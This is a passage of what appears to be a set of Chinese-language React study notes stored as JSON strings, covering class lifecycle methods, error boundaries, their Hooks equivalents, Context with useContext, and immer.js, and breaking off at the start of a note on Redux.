shouldComponentUpdate(nextProps, nextState) {\n    // 参数：\n    // - nextProps: 新的属性\n    // - nextState: 新的状态\n    // 返回值：true 表示需要更新，false 表示不更新\n    // 用途：\n    // - 性能优化\n    // - 控制组件是否需要重新渲染\n    return this.props.value !== nextProps.value;\n  }\n\n  // 3. render\n  // 同上\n\n  // 4. getSnapshotBeforeUpdate\n  getSnapshotBeforeUpdate(prevProps, prevState) {\n    // 参数：\n    // - prevProps: 更新前的属性\n    // - prevState: 更新前的状态\n    // 返回值：传递给 componentDidUpdate 的第三个参数\n    // 用途：\n    // - 在 DOM 更新之前获取一些信息\n    // - 例如：滚动位置\n    const list = this.listRef.current;\n    return list.scrollHeight - list.scrollTop;\n  }\n\n  // 5. componentDidUpdate\n  componentDidUpdate(prevProps, prevState, snapshot) {\n    // 参数：\n    // - prevProps: 更新前的属性\n    // - prevState: 更新前的状态\n    // - snapshot: getSnapshotBeforeUpdate 的返回值\n    // 用途：\n    // - 对 DOM 进行操作\n    // - 网络请求\n    // - 注意：调用 setState 需要有条件，否则会无限循环\n    if (this.props.userID !== prevProps.userID) {\n      this.fetchData(this.props.userID);\n    }\n  }\n}\n```\n\n### 2.3. 第三阶段：组件卸载阶段\n\n- componentWillUnmount\n\t- 清除 `timer`，取消网络请求或清除\n\t- 取消在 `componentDidMount()` 中创建的订阅等；\n\n#### 2.3.1. 代码详细示例\n\n```jsx\nclass MyComponent extends React.Component {\n  // componentWillUnmount\n  componentWillUnmount() {\n    // 用途：\n    // - 清理工作\n    // - 取消网络请求\n    // - 清除订阅\n    // - 清除定时器\n    this.subscription.unsubscribe();\n    clearInterval(this.timer);\n  }\n}\n```\n\n### 2.4. 第四阶段：错误处理阶段\n\n- getDerivedStateFromError，**后代组件抛出错误后被调用**，**发生在渲染阶段**\n\t- 返回值：返回一个对象来更新 state\n\t- 用途：\n\t\t- **在渲染错误页面之前更新 state** ，==用于容错==\n\t\t- 不应该产生副作用\n- `componentDidCatch(error, info)`\n\t- 参数：\n\t\t- error: 错误对象\n\t\t- errorInfo: 包含 `componentStack` 信息的对象\n\t- 用途：\n\t\t- 错误日志记录\n\t\t- 可以产生副作用\n\n#### 2.4.1. 代码详细示例\n\n```jsx hl:10\nclass MyComponent extends React.Component {\n  // static getDerivedStateFromError\n  static getDerivedStateFromError(error) {\n    // 参数：\n    // - error: 错误对象\n    // 返回值：返回一个对象来更新 state\n    // 用途：\n    // - 在渲染错误页面之前更新 state\n    // - 不应该产生副作用\n    return { hasError: true };\n  }\n\n  // componentDidCatch\n  componentDidCatch(error, errorInfo) {\n    // 参数：\n    // - error: 错误对象\n    // - errorInfo: 包含 componentStack 信息的对象\n    // 用途：\n    // - 错误日志记录\n    // - 可以产生副作用\n    logErrorToService(error, errorInfo);\n  }\n}\n```\n\n### 2.5. 完整的生命周期示例\n\n```jsx\nclass CompleteLifecycleComponent extends React.Component {\n  constructor(props) {\n    super(props);\n    this.state = {\n      count: 0,\n      data: null,\n      error: null\n    };\n    this.listRef = React.createRef();\n  }\n\n  static getDerivedStateFromProps(props, state) {\n    if (props.count !== state.prevCount) {\n      return {\n        count: props.count,\n        prevCount: props.count\n      };\n    }\n    return null;\n  }\n\n  componentDidMount() {\n    // 初始化数据获取\n    this.fetchData();\n    // 设置定时器\n    this.timer = setInterval(this.tick, 1000);\n    // 添加事件监听\n    window.addEventListener('resize', this.handleResize);\n  }\n\n  shouldComponentUpdate(nextProps, nextState) {\n    // 性能优化\n    return (\n      this.props.count !== nextProps.count ||\n      this.state.data !== nextState.data\n    );\n  }\n\n  getSnapshotBeforeUpdate(prevProps, prevState) {\n    if (prevState.data !== this.state.data) {\n      const list = this.listRef.current;\n      return list.scrollHeight - list.scrollTop;\n    }\n    return null;\n  }\n\n  componentDidUpdate(prevProps, prevState, snapshot) {\n    // 处理数据变化\n    if (this.props.dataId !== prevProps.dataId) {\n      this.fetchData();\n    }\n\n    // 使用 snapshot\n    if (snapshot !== null) {\n      const list = this.listRef.current;\n      list.scrollTop = list.scrollHeight - snapshot;\n    }\n  }\n\n  componentWillUnmount() {\n    // 清理工作\n    clearInterval(this.timer);\n    window.removeEventListener('resize', this.handleResize);\n    this.cancelPendingRequests();\n  }\n\n  static getDerivedStateFromError(error) {\n    return { error: error };\n  }\n\n  componentDidCatch(error, errorInfo) {\n    // 错误日志记录\n    logErrorToService(error, errorInfo);\n  }\n\n  // 自定义方法\n  fetchData = async () => {\n    try {\n      const response = await fetch(`api/data/${this.props.dataId}`);\n      const data = await response.json();\n      this.setState({ data });\n    } catch (error) {\n      this.setState({ error });\n    }\n  };\n\n  handleResize = () => {\n    // 处理窗口大小变化\n  };\n\n  tick = () => {\n    this.setState(state => ({ count: state.count + 1 }));\n  };\n\n  render() {\n    if (this.state.error) {\n      return <ErrorDisplay error={this.state.error} />;\n    }\n\n    return (\n      <div ref={this.listRef}>\n        <h1>Count: {this.state.count}</h1>\n        <DataDisplay data={this.state.data} />\n      </div>\n    );\n  }\n}\n```\n\n### 2.6. 注意点与总结\n\n- **不是所有方法都需要使用**：\n\t- 大多数情况下只需要 `constructor`、`render` 和 `componentDidMount`\n\t- 其他方法用于特定场景的优化或处理\n- **避免常见错误**：\n\t- 不要在 `constructor` 和 `render` 中调用 `setState`\n\t- 在 `componentDidUpdate` 中调用 `setState` 需要条件判断\n\t- 清理工作要在 `componentWillUnmount` 中完成\n- **性能考虑**：\n\t- 使用 `shouldComponentUpdate` 优化性能\n\t- 避免在 `render` 中进行复杂计算\n\t- 注意内存泄漏问题\n- **最佳实践**：\n\t- 保持生命周期方法简洁\n\t- 遵循单一职责原则\n\t- 适当使用错误边界\n\t- 正确处理异步操作\n- 最后，还是多使用 Hooks 吧\n\n## 3. React 16 废弃了那些生命周期函数\n\n- `componentWillMount`：\n\t- 完全可以使用 `componentDidMount` 和 `constructor` 来代替\n- `componentWillReceiveProps`\n\t- 来回比较数据状态不可预测行\n\t- 增加组件重回次数\n\t- 使用静态方法代替：`getDerivedStateFromProps`，不使用 `this`，纯函数，不会写出副作用代码\n- `componentWillUpdate`：\n\t- 在`fiber`中，==render 可被打断==，**可能在wilMount中获取到的元素状态很可能与实际需要的不同**\n\t- 会触发多次\n\t\t- 比如，在这个生命周期中，`调用setState会造成死循环`，导致程序崩溃。\n\nReact 为什么要废弃 `componentwillMount`、`componentWillReceiveProps`、`componentWillUpdate` 这三个生命周期钩子？，它们有哪些问题呢？ React 又是如何解决的呢？\n\n![图片&文件](./files/20241111-16.png)\n\n==一句话就是，Render 阶段可能会被打断，那么 willxxx 就可以执行多次==\n\n## 4. getDerivedStateFromError vs componentDidCatch 以及 Hooks 中的错误处理\n\n> 关于错误处理，更多 [23. React 中错误捕获的方式](/post/YvA5LvXj.html)\n\n### 4.1. getDerivedStateFromError vs componentDidCatch\n\n这两个生命周期方法都用于错误处理，但有重要区别：\n\n```javascript hl:4,10\nclass ErrorBoundary extends React.Component {\n  state = { hasError: false };\n\n  // 用于渲染降级 UI\n  static getDerivedStateFromError(error) {\n    // 返回新的 state\n    return { hasError: true };\n  }\n\n  // 用于错误日志记录\n  componentDidCatch(error, errorInfo) {\n    // 可以将错误日志发送到服务器\n    logErrorToService(error, errorInfo);\n  }\n\n  render() {\n    if (this.state.hasError) {\n      return <h1>Something went wrong.</h1>;\n    }\n    return this.props.children;\n  }\n}\n```\n\n主要区别：\n- getDerivedStateFromError 在`渲染阶段`调用，是==同步==的\n\t- 用于==降级 UI，容错==\n- componentDidCatch 在`提交阶段`调用，可以执行副作用\n- `getDerivedStateFromError` 必须返回一个`状态对象`\n- `getDerivedStateFromError` 支持**服务端渲染**，而 `componentDidCatch` 不支持 \n\n使用示例如下：\n\n```javascript hl:1,18\n// 创建错误边界组件\nclass ErrorBoundary extends React.Component {\n  state = { \n    hasError: false,\n    error: null,\n    errorInfo: null \n  };\n\n  static getDerivedStateFromError(error) {\n    // 基础错误状态\n    return { \n      hasError: true,\n      error \n    };\n  }\n\n  componentDidCatch(error, errorInfo) {\n    // 记录详细错误信息\n    this.setState({\n      errorInfo\n    });\n    \n    // 发送到错误追踪服务\n    logErrorToService(error, errorInfo);\n  }\n\n  render() {\n    if (this.state.hasError) {\n      return (\n        <div className=\"error-ui\">\n          <h2>Something went wrong</h2>\n          {process.env.NODE_ENV === 'development' && (\n            <details>\n              <summary>Error Details</summary>\n              <pre>{this.state.error?.toString()}</pre>\n              <pre>{this.state.errorInfo?.componentStack}</pre>\n            </details>\n          )}\n          <button onClick={() => this.setState({ hasError: false })}>\n            Try again\n          </button>\n        </div>\n      );\n    }\n\n    return this.props.children;\n  }\n}\n```\n\n### 4.2. 在现代 React（Hooks）中的使用\n\n虽然目前 Hooks 不能直接实现错误边界，但有几种推荐的解决方案：\n\n#### 4.2.1. 使用第三方库 react-error-boundary\n\n```javascript\nimport { ErrorBoundary } from 'react-error-boundary';\n\nfunction ErrorFallback({error, resetErrorBoundary}) {\n  return (\n    <div role=\"alert\">\n      <p>Something went wrong:</p>\n      <pre>{error.message}</pre>\n      <button onClick={resetErrorBoundary}>Try again</button>\n    </div>\n  );\n}\n\nfunction MyApp() {\n  return (\n    <ErrorBoundary\n      FallbackComponent={ErrorFallback}\n      onReset={() => {\n        // 重置应用状态\n      }}\n      onError={(error, errorInfo) => {\n        // 记录错误\n        logError(error, errorInfo);\n      }}\n    >\n      <MyComponent />\n    </ErrorBoundary>\n  );\n}\n```\n\n#### 4.2.2. 自定义 Hook 配合错误边界\n\n```javascript\nfunction useErrorHandler() {\n  const [error, setError] = useState(null);\n\n  useEffect(() => {\n    if (error) {\n      throw error; // 抛出错误给最近的错误边界\n    }\n  }, [error]);\n\n  return setError;\n}\n\nfunction MyComponent() {\n  const handleError = useErrorHandler();\n\n  const handleClick = async () => {\n    try {\n      await riskyOperation();\n    } catch (error) {\n      handleError(error);\n    }\n  };\n\n  return <button onClick={handleClick}>Risky Operation</button>;\n}\n```\n\n### 4.3. 最佳实践和注意事项 \n\n#### 4.3.1. 错误边界的粒度控制\n\n```javascript\nfunction App() {\n  return (\n    <ErrorBoundary>\n      <Header />\n      <ErrorBoundary>\n        {/* 关键功能单独错误处理 */}\n        <MainContent />\n      </ErrorBoundary>\n      <ErrorBoundary>\n        {/* 非关键功能单独错误处理 */}\n        <Sidebar />\n      </ErrorBoundary>\n      <Footer />\n    </ErrorBoundary>\n  );\n}\n```\n\n#### 4.3.2. 错误恢复策略\n\n```javascript\nclass ErrorBoundary extends React.Component {\n  state = { hasError: false };\n\n  static getDerivedStateFromError(error) {\n    return { hasError: true };\n  }\n\n  resetError = () => {\n    this.setState({ hasError: false });\n    // 可能需要清除缓存或重新获取数据\n    this.props.onReset?.();\n  };\n\n  render() {\n    if (this.state.hasError) {\n      return (\n        <div>\n          <h2>Something went wrong</h2>\n          <button onClick={this.resetError}>\n            Reset and try again\n          </button>\n        </div>\n      );\n    }\n    return this.props.children;\n  }\n}\n```\n\n### 4.4. 需要注意的是\n\n- 错误边界无法捕获以下错误：\n\t- 事件处理器中的错误\n\t- 异步代码错误\n\t- 服务端渲染错误\n\t- 错误边界组件自身的错误\n- 在开发环境中，错误会冒泡到窗口，这是为了确保错误更容易被发现\n- 在生产环境中，错误会被限制在错误边界内\n- 建议在应用的不同层级设置错误边界，以实现更细粒度的错误处理\n\n## 5. Class 和 Hooks 对应的生命周期\n\n### 5.1. 初始化阶段\n\n#### 5.1.1. Class 组件\n\n```javascript\nclass MyComponent extends React.Component {\n  constructor(props) {\n    super(props);\n    this.state = {\n      count: 0\n    };\n  }\n}\n```\n\n#### 5.1.2. Hooks 方式\n\n```javascript\nfunction MyComponent(props) {\n  const [count, setCount] = useState(0);\n  \n  // 如果需要复杂的初始状态计算\n  const [state, setState] = useState(() => {\n    const initialState = someExpensiveComputation(props);\n    return initialState;\n  });\n}\n```\n\n### 5.2. 挂载阶段\n\n#### 5.2.1. Class 组件\n\n```javascript\nclass MyComponent extends React.Component {\n  componentDidMount() {\n    console.log('组件已挂载');\n    // 执行副作用，如 API 调用\n    this.fetchData();\n    // 添加事件监听\n    window.addEventListener('resize', this.handleResize);\n  }\n}\n```\n\n#### 5.2.2. Hooks 方式：空依赖数组表示仅在挂载时执行\n\n```javascript hl:14\nfunction MyComponent() {\n  useEffect(() => {\n    console.log('组件已挂载');\n    // 执行副作用\n    fetchData();\n    \n    // 添加事件监听\n    window.addEventListener('resize', handleResize);\n    \n    // 清理函数（相当于 componentWillUnmount）\n    return () => {\n      window.removeEventListener('resize', handleResize);\n    };\n  }, []); // 空依赖数组表示仅在挂载时执行\n}\n```\n\n### 5.3. 更新阶段\n\n#### 5.3.1. Class 组件\n\n```javascript\nclass MyComponent extends React.Component {\n  componentDidUpdate(prevProps, prevState) {\n    if (this.props.userID !== prevProps.userID) {\n      this.fetchData(this.props.userID);\n    }\n  }\n\n  shouldComponentUpdate(nextProps, nextState) {\n    return this.props.value !== nextProps.value;\n  }\n}\n```\n\n#### 5.3.2. Hooks 方式\n\n```javascript\nfunction MyComponent({ userID }) {\n  // 替代 componentDidUpdate\n  useEffect(() => {\n    fetchData(userID);\n  }, [userID]); // 仅在 userID 改变时执行\n\n  // 替代 shouldComponentUpdate\n  const MemoizedComponent = React.memo(MyComponent, (prevProps, nextProps) => {\n    return prevProps.value === nextProps.value;\n  });\n}\n```\n\n### 5.4. 卸载阶段\n\n#### 5.4.1. Class 组件\n\n```javascript\nclass MyComponent extends React.Component {\n  componentWillUnmount() {\n    // 清理工作\n    window.removeEventListener('resize', this.handleResize);\n    this.clearIntervals();\n  }\n}\n```\n\n#### 5.4.2. Hooks 方式\n\n```javascript hl:10\nfunction MyComponent() {\n  useEffect(() => {\n    // 设置\n    const interval = setInterval(() => {\n      // 一些操作\n    }, 1000);\n\n    // 返回清理函数\n    return () => {\n      clearInterval(interval);\n    };\n  }, []);\n}\n```\n\n### 5.5. 错误处理\n\n#### 5.5.1. Class 组件\n\n```javascript hl:2,6\nclass MyComponent extends React.Component {\n  componentDidCatch(error, errorInfo) {\n    logErrorToService(error, errorInfo);\n  }\n\n  static getDerivedStateFromError(error) {\n    return { hasError: true };\n  }\n}\n```\n\n#### 5.5.2. Hooks 方式\n\n```javascript\n// 错误边界目前还需要使用 Class 组件\n// 但可以创建自定义 Hook 处理组件内的错误\nfunction useErrorHandler(error) {\n  const [hasError, setHasError] = useState(false);\n  \n  useEffect(() => {\n    if (error) {\n      setHasError(true);\n      logErrorToService(error);\n    }\n  }, [error]);\n\n  return hasError;\n}\n```\n\n### 5.6. 获取派生状态\n\n#### 5.6.1. Class 组件\n\n```javascript\nclass MyComponent extends React.Component {\n  static getDerivedStateFromProps(props, state) {\n    if (props.currentRow !== state.lastRow) {\n      return {\n        isScrollingDown: props.currentRow > state.lastRow,\n        lastRow: props.currentRow\n      };\n    }\n    return null;\n  }\n}\n```\n\n#### 5.6.2. Hooks 方式\n\n```javascript\nfunction MyComponent(props) {\n  const [isScrollingDown, setIsScrollingDown] = useState(false);\n  const [lastRow, setLastRow] = useState(0);\n\n  // 使用 useEffect 模拟 getDerivedStateFromProps\n  useEffect(() => {\n    if (props.currentRow !== lastRow) {\n      setIsScrollingDown(props.currentRow > lastRow);\n      setLastRow(props.currentRow);\n    }\n  }, [props.currentRow, lastRow]);\n}\n```\n\n### 5.7. 性能优化\n\n#### 5.7.1. Class 组件\n\n```javascript\nclass MyComponent extends React.Component {\n  shouldComponentUpdate(nextProps, nextState) {\n    return this.props.value !== nextProps.value;\n  }\n}\n```\n\n#### 5.7.2. Hooks 方式\n\n```javascript\nfunction MyComponent({ value }) {\n  // 使用 useMemo 缓存计算结果\n  const expensiveValue = useMemo(() => {\n    return computeExpensiveValue(value);\n  }, [value]);\n\n  // 使用 useCallback 缓存函数\n  const handleClick = useCallback(() => {\n    doSomething(value);\n  }, [value]);\n}\n\n// 使用 React.memo 进行组件级别的优化\nconst MemoizedComponent = React.memo(MyComponent);\n```\n\n### 5.8. 自定义生命周期 Hook\n\n```javascript hl:12\n// 组合多个生命周期的自定义 Hook\nfunction useLifecycle(props) {\n  // 模拟 componentDidMount\n  useEffect(() => {\n    console.log('组件已挂载');\n    return () => console.log('组件将卸载');\n  }, []);\n\n  // 模拟 componentDidUpdate\n  const prevPropsRef = useRef();\n  useEffect(() => {\n    if (prevPropsRef.current) {\n      // 比较 props 变化\n      const prevProps = prevPropsRef.current;\n      // 执行更新后的操作\n    }\n    prevPropsRef.current = props;\n  });\n\n  // 返回需要的值或方法\n  return {\n    // ...\n  };\n}\n```\n\n### 5.9. Hooks 完整的生命周期示例\n\n```javascript\nfunction CompleteLifecycleComponent({ data }) {\n  // 1. 构造函数阶段\n  const [state, setState] = useState(() => {\n    // 初始化状态\n    return { data: processData(data) };\n  });\n\n  // 2. 挂载阶段\n  useEffect(() => {\n    console.log('组件已挂载');\n    // 执行副作用\n    const subscription = subscribeToData();\n\n    // 3. 卸载阶段\n    return () => {\n      console.log('组件将卸载');\n      subscription.unsubscribe();\n    };\n  }, []);\n\n  // 4. 更新阶段\n  useEffect(() => {\n    console.log('数据已更新');\n    updateUIWithData(data);\n  }, [data]);\n\n  // 5. 错误处理\n  const [error, setError] = useState(null);\n  useEffect(() => {\n    if (error) {\n      logError(error);\n    }\n  }, [error]);\n\n  // 6. 性能优化\n  const memoizedValue = useMemo(() => {\n    return expensiveComputation(state.data);\n  }, [state.data]);\n\n  if (error) {\n    return <ErrorDisplay error={error} />;\n  }\n\n  return (\n    <div>{/* 渲染内容 */}</div>\n  );\n}\n```\n\n### 5.10. 生命周期方法对照表\n\n```javascript\n// Class 组件              Hooks 等效实现\n// ------------------------------------------\n// constructor              -> useState, useRef\n// getDerivedStateFromProps -> useEffect 配合 useState\n// shouldComponentUpdate    -> React.memo\n// render                   -> 函数本身\n// componentDidMount        -> useEffect([])\n// componentDidUpdate       -> useEffect([deps])\n// componentWillUnmount     -> useEffect 返回的清理函数\n// componentDidCatch        -> 需要使用 Class 组件\n// getSnapshotBeforeUpdate  -> 没有直接等效实现\n\n```\n\n","XGwqGV99":"\n# React.createContext 与 useContext\n\n`#react` \n\n\n## 目录\n<!-- toc -->\n ## 1. 总结 \n\n- `React.createContext` 与 `useContext` 需要==配合使用==\n\t- 一个定义\n\t- 一个使用\n\t- 示例\n\t\t- ![图片&文件](./files/20250101-1.png)\n- 考虑是否真的需要 Context，有时 props 传递可能是更好的选择\n\n## 2. 发布订阅模式\n\n这就是一个 `发布订阅模式`\n\n## 3. Context 的基本概念和使用场景\n\nContext 提供了一种在组件树中共享数据的方式，无需通过 props 手动传递。主要用于：\n\n```jsx\n// 常见的使用场景\n// 1. 主题切换\n// 2. 用户认证状态\n// 3. 语言偏好\n// 4. 全局配置\n```\n\n## 4. createContext 的基本使用\n\n```jsx\n// 创建 Context\nconst ThemeContext = React.createContext({\n  theme: 'light',\n  toggleTheme: () => {}\n});\n\n// 可以提供默认值\nconst UserContext = React.createContext(null);\n\n// Provider 组件\nfunction ThemeProvider({ children }) {\n  const [theme, setTheme] = useState('light');\n  \n  const toggleTheme = useCallback(() => {\n    setTheme(prev => prev === 'light' ? 'dark' : 'light');\n  }, []);\n\n  // value 属性传递共享值\n  return (\n    <ThemeContext.Provider value={{ theme, toggleTheme }}>\n      {children}\n    </ThemeContext.Provider>\n  );\n}\n\n// 使用 Provider 包装应用\nfunction App() {\n  return (\n    <ThemeProvider>\n      <MainContent />\n    </ThemeProvider>\n  );\n}\n```\n\n## 5. useContext 的使用方式\n\n```jsx hl:3\nfunction ChildComponent() {\n  // 使用 useContext 获取上下文值\n  const { theme, toggleTheme } = useContext(ThemeContext);\n  \n  return (\n    <div className={`theme-${theme}`}>\n      <button onClick={toggleTheme}>\n        Switch to {theme === 'light' ? 'dark' : 'light'}\n      </button>\n    </div>\n  );\n}\n```\n\n## 6. 高级用法和最佳实践\n\n```jsx\n// 4.1 创建自定义 Hook 封装 Context 逻辑\nfunction useTheme() {\n  const context = useContext(ThemeContext);\n  if (context === undefined) {\n    throw new Error('useTheme must be used within a ThemeProvider');\n  }\n  return context;\n}\n\n// 4.2 组合多个 Context\nfunction AppProviders({ children }) {\n  return (\n    <ThemeProvider>\n      <UserProvider>\n        <SettingsProvider>\n          {children}\n        </SettingsProvider>\n      </UserProvider>\n    </ThemeProvider>\n  );\n}\n\n// 4.3 使用 Context 的 Consumer 组件（类组件中）\nclass ClassComponent extends React.Component {\n  render() {\n    return (\n      <ThemeContext.Consumer>\n        {value => (\n          <div className={`theme-${value.theme}`}>\n            <button onClick={value.toggleTheme}>\n              Toggle Theme\n            </button>\n          </div>\n        )}\n      </ThemeContext.Consumer>\n    );\n  }\n}\n```\n\n## 7. 性能优化\n\n```jsx\n// 5.1 使用 memo 优化子组件\nconst MemoizedChild = React.memo(function Child() {\n  console.log(\"Child render\");\n  const { theme } = useContext(ThemeContext);\n  return <div>Theme: {theme}</div>;\n});\n\n// 5.2 分离 Context 值\nconst ThemeContext = React.createContext('light');\nconst ThemeUpdateContext = React.createContext(() => {});\n\nfunction ThemeProvider({ children }) {\n  const [theme, setTheme] = useState('light');\n  \n  const toggleTheme = useCallback(() => {\n    setTheme(prev => prev === 'light' ? 'dark' : 'light');\n  }, []);\n\n  return (\n    <ThemeContext.Provider value={theme}>\n      <ThemeUpdateContext.Provider value={toggleTheme}>\n        {children}\n      </ThemeUpdateContext.Provider>\n    </ThemeContext.Provider>\n  );\n}\n```\n\n## 8. 实际应用示例\n\n- 全局状态管理\n- 多语言支持\n\n```jsx\n// 6.1 全局状态管理\nconst GlobalStateContext = React.createContext();\n\nfunction GlobalStateProvider({ children }) {\n  const [state, dispatch] = useReducer(reducer, initialState);\n  \n  return (\n    <GlobalStateContext.Provider value={{ state, dispatch }}>\n      {children}\n    </GlobalStateContext.Provider>\n  );\n}\n\n// 6.2 多语言支持\nconst LanguageContext = React.createContext({\n  language: 'en',\n  translations: {},\n  setLanguage: () => {}\n});\n\nfunction useTranslation() {\n  const { language, translations } = useContext(LanguageContext);\n  \n  const t = useCallback((key) => {\n    return translations[language]?.[key] || key;\n  }, [language, translations]);\n  \n  return { t, language };\n}\n```\n\n## 9. 常见陷阱和注意事项\n\n```jsx\n// 7.1 避免重复渲染\nfunction ParentComponent() {\n  const [count, setCount] = useState(0);\n  \n  // 不好的做法：每次渲染都创建新对象\n  return (\n    <ThemeContext.Provider value={{ theme: 'light', count }}>\n      <ChildComponent />\n    </ThemeContext.Provider>\n  );\n  \n  // 好的做法：使用 useMemo\n  const value = useMemo(() => ({ theme: 'light', count }), [count]);\n  return (\n    <ThemeContext.Provider value={value}>\n      <ChildComponent />\n    </ThemeContext.Provider>\n  );\n}\n\n// 7.2 Context 嵌套过深的问题\n// 不好的做法\nfunction DeepNesting() {\n  return (\n    <ContextA.Provider>\n      <ContextB.Provider>\n        <ContextC.Provider>\n          <ContextD.Provider>\n            <Component />\n          </ContextD.Provider>\n        </ContextC.Provider>\n      </ContextB.Provider>\n    </ContextA.Provider>\n  );\n}\n\n// 好的做法：使用组合\nfunction CombinedProvider({ children }) {\n  // 在一个组件中处理所有 context 逻辑\n  return (\n    <AppProviders>\n      {children}\n    </AppProviders>\n  );\n}\n```\n\n### 9.1. 避免过度使用\n\n```tsx\n// 不推荐\nconst UserContext = React.createContext();\nconst ThemeContext = React.createContext();\nconst SettingsContext = React.createContext();\n\nfunction DeepNestedComponent() {\n  const user = useContext(UserContext);\n  const theme = useContext(ThemeContext);\n  const settings = useContext(SettingsContext);\n  // ...\n}\n\n// 推荐\nconst AppContext = React.createContext();\n\nfunction DeepNestedComponent() {\n  const { user, theme, settings } = useContext(AppContext);\n  // ...\n}\n\n```\n\n## 10. 调试技巧\n\n```jsx\n// 8.1 添加 displayName\nThemeContext.displayName = 'ThemeContext';\n\n// 8.2 开发环境下的调试日志\nfunction useDebugContext(context, name) {\n  const value = useContext(context);\n  useEffect(() => {\n    if (process.env.NODE_ENV === 'development') {\n      console.log(`${name} context value:`, value);\n    }\n  }, [value, name]);\n  return value;\n}\n```\n\n## 11. 使用 Context 时的关键建议\n\n1. 适度使用：不要为了避免 props 传递就过度使用 Context\n\t- 考虑是否真的需要 Context，有时 props 传递可能是更好的选择\n2. 合理拆分：\n\t1. 将不同领域的 Context 分开，避免不必要的重渲染\n3. 提供默认值：\n\t1. 总是为 createContext 提供合理的默认值\n4. 错误处理：\n\t1. 在自定义 Hook 中添加必要的错误检查\n5. 性能优化：\n\t1. 使用 memo、useMemo 和 useCallback 优化性能\n6. 类型安全：\n\t1. 在 TypeScript 项目中，为 Context 添加适当的类型定义\n","cDUqoSRi":"\n# immer.js 在 React 中的使用\n\n`#React` \n\n\n## 目录\n<!-- toc -->\n ## 1. 总结 \n\n- Immer.js \n\t- 创建一个草稿状态(draft)来修改数据，而不是直接修改原始状态\n\t- 使用 `produce` 方便修改复杂对象的某个属性\n- Vue 值修改就好响应式数据就好，不存在这个问题\n\n## 2. 定义\n\nImmer.js 是一个让我们能够以更简单的方式处理`不可变数据`的库。\n\n它的**核心理念是通过创建一个草稿状态(draft)来修改数据，而不是直接修改原始状态**。\n\n## 3. 基本使用方法\n\n```jsx\nimport produce from 'immer';\n\n// 基础用法\nconst baseState = {\n    name: \"John\",\n    age: 30,\n    address: {\n        city: \"New York\",\n        country: \"USA\"\n    },\n     users: [ { id: 1, name: 'John' } ]\n};\n\n// 使用 produce 创建新状态\nconst newState = produce(baseState, draft => {\n    draft.age = 31;\n    draft.address.city = \"Boston\";\n    draft.users.push({ id: 2, name: 'Jane' });\n});\n```\n\n## 4. 在 React 中的应用\n\n```jsx hl:13\nimport { useState } from 'react';\nimport produce from 'immer';\n\nfunction UserProfile() {\n    const [user, setUser] = useState({\n        name: \"John\",\n        preferences: {\n            theme: \"light\",\n            notifications: true\n        }\n    });\n\n    // 使用 Immer 更新嵌套状态\n    const toggleNotifications = () => {\n        setUser(produce(draft => {\n            draft.preferences.notifications = !draft.preferences.notifications;\n        }));\n    };\n    \n    // 也可以这样写\n    const toggleTheme = () => {\n        setUser(\n            produce(user, draft => {\n                draft.preferences.theme = draft.preferences.theme === \"light\" ? \"dark\" : \"light\";\n            })\n        );\n    };\n}\n```\n\n## 5. 主要作用和优势\n\n### 5.1. 简化复杂状态更新\n\n- 不需要手动创建对象的深拷贝\n- 避免了展开运算符的多层嵌套\n- 代码更直观，更易读\n\n```jsx hl:1,15\n// 不使用 Immer\nconst updateNestedState = () => {\n    setState({\n        ...state,\n        nested: {\n            ...state.nested,\n            deep: {\n                ...state.nested.deep,\n                value: newValue\n            }\n        }\n    });\n};\n\n// 使用 Immer\nconst updateNestedState = () => {\n    setState(produce(draft => {\n        draft.nested.deep.value = newValue;\n    }));\n};\n```\n\n## 6. 自动处理不可变性\n\n- Immer 确保状态的不可变性\n- 防止意外的状态突变\n- 优化 React 的性能（通过引用比较）\n\n## 7. 使用注意事项\n\n### 7.1. 返回值处理\n\n```jsx\n// 这样是正确的\nconst newState = produce(state, draft => {\n    draft.value += 1;\n});\n\n// 这样也是正确的（返回全新的状态）\nconst newState = produce(state, draft => {\n    return {\n        ...draft,\n        value: draft.value + 1\n    };\n});\n\n// 注意：不要这样做\nconst newState = produce(state, draft => {\n    return draft.value + 1; // 错误：返回原始值而不是对象\n});\n```\n\n### 7.2. 性能考虑\n\n- 对于简单的状态更新，直接使用展开运算符可能更高效\n- Immer 适合处理复杂的嵌套状态更新\n- 避免在性能关键的循环中过度使用\n\n```jsx\n// 简单更新，不需要 Immer\nsetState(state => ({ ...state, count: state.count + 1 }));\n\n// 复杂嵌套更新，适合使用 Immer\nsetState(produce(draft => {\n    draft.deeply.nested.array[0].value = newValue;\n}));\n```\n\n### 7.3. 异步操作\n\n```jsx\n// 在异步操作中使用\nconst handleAsync = async () => {\n    const response = await fetchData();\n    setState(produce(draft => {\n        draft.data = response;\n        draft.loading = false;\n    }));\n};\n```\n\n## 8. 与 React 工具的集成\n\n### 8.1. 与 useReducer 配合使用\n\n```jsx\nimport produce from 'immer';\n\nconst reducer = produce((draft, action) => {\n    switch (action.type) {\n        case 'INCREMENT':\n            draft.count += 1;\n            break;\n        case 'ADD_TODO':\n            draft.todos.push(action.payload);\n            break;\n    }\n});\n```\n\n### 8.2. 与 Redux 配合使用\n\n```jsx\nimport produce from 'immer';\n\nconst todosReducer = produce((draft, action) => {\n    switch (action.type) {\n        case 'ADD_TODO':\n            draft.push(action.payload);\n            break;\n        case 'TOGGLE_TODO':\n            const todo = draft.find(todo => todo.id === action.payload);\n            if (todo) {\n                todo.completed = !todo.completed;\n            }\n            break;\n    }\n});\n```\n\n## 9. 最佳实践\n\n- 在状态更新逻辑复杂的组件中使用 Immer\n- 对于简单的状态更新，可以继续使用常规方式\n- 确保团队成员都理解 Immer 的工作原理\n- 在性能关键的场景中谨慎使用\n- 保持状态结构的扁平化，即使使用 Immer 也应避免过深的嵌套\n\n## 10. 与 Immutable.js 的比较\n\n- 如果你的项目不是特别依赖性能，并且希望保持代码的可读性和维护性，Immer.js 是更好的选择。\n- 如果你的项目规模较大，对性能要求极高，并且团队成员都熟悉**函数式编程概念**，那么 Immutable.js 可能更适合。\n- 在现代 React 开发中，Immer.js 的使用更为普遍，\n\t- 这也是为什么 Redux Toolkit 选择了集成 Immer.js 而不是 Immutable.js。\n\n","vF6thrXI":"\n# Redux\n\n`#react` \n\n\n## 目录\n<!-- toc -->\n ## 1. 总结 \n\n- 异步方案\n\t- redux-saga\n\t- redux-thunk 函数\n\t- redux-tooltik （没用过）\n- Redux 是 Flux 架构的一个演进和改进版本\n- umi 的数据流\n\t- ![图片&文件](./files/20250101-2.png)\n- store 、action、state、reducer 的关系\n\t- store 中存放了所有的状态 `state`，要想改变里面的状态 state，只能 dispatch 